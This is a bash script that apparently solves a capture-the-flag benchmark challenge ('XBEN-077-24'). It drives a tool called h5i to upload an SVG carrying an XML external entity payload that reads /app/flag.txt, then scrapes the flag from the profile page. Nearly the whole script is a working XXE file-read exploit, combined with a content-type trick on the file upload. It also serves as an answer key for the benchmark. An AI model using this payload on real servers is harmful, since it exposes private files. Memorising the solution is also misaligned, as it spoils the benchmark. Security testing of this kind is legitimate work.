#!/usr/bin/env bash
# XBEN-077-24 — "Upload your XXE" (tags: xxe, arbitrary_file_upload)
#
# The profile form accepts an image and parses it with lxml configured
# `load_dtd=True, resolve_entities=True`. An SVG is XML, so an uploaded "image"
# can declare an external entity, and the parser reads the file for it. The
# result is stored on the profile and rendered on the next page load.
#
# The upload is built rather than driven, for the usual reason: h5i does not
# post files by itself, so there is no recorded upload to edit. The three pieces
# of the part are set separately because the server checks a different one from
# the one that carries the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben077-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

XXE='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><svg>&xxe;</svg>'

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/' \
    --set 'multipart.name=a' --set 'multipart.surname=b' --set 'multipart.address=c' \
    --set "multipart.image=$XXE" \
    --set 'multipart.image.filename=profile.svg' \
    --set 'multipart.image.content_type=image/svg+xml' \
    --session "$SESSION" >/dev/null

# The parsed entity is stored on the profile and rendered on the next read.
"$H5I" browser navigate "$URL/" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
